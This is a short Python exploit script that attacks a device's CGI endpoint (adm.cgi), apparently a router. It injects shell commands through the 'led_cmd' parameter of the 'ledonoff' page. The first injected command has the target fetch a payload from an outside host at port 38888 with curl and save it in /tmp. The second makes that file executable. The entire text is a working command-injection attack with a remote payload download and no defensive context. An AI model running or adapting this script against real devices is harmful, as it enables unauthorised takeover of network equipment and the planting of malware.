#!/usr/bin/env python3

import requests

TARGET_URL = "http://192.168.123.254/cgi-bin/adm.cgi"
PAYLOAD_URL = "http://192.168.123.183:38888/exploit"

print("[+] Uploading exploit to /tmp/exploit")
data = {"page": "ledonoff", "led_cmd": "curl -o /tmp/exploit {}".format(PAYLOAD_URL)}
r = requests.post(TARGET_URL, data=data)

print("[+] Making /tmp/exploit is executable")
data = {"page": "ledonoff", "led_cmd": "chmod u+x /tmp/exploit"}
r = requests.post(TARGET_URL, data=data)

print("[+] Done!")
